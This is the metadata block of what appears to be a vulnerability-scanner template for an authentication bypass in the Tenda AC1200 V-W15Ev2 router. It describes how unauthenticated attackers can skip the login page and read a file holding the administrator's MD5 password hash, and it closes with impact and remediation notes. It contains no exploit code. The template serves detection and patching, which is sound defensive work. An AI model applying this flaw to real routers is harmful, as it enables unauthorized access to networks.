info:
  name: Tenda AC1200 V-W15Ev2 - Authentication Bypass
  author: gy741
  severity: medium
  description: |
    The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management. The software does not perform or incorrectly perform an authorization check when a user attempts to access a resource or perform an action. This allows the router's login page to be bypassed. The improper validation of user sessions/authorization can lead to unauthenticated attackers having the ability to read the router's file, which contains the MD5 password of the Administrator's user account. This vulnerability exists within the local web and hosted remote management console.
  impact: |
    Successful exploitation of this vulnerability can lead to unauthorized configuration changes, network compromise, and potential access to sensitive information.
  remediation: |
    Apply the latest firmware update provided by the vendor to fix the authentication bypass vulnerability.
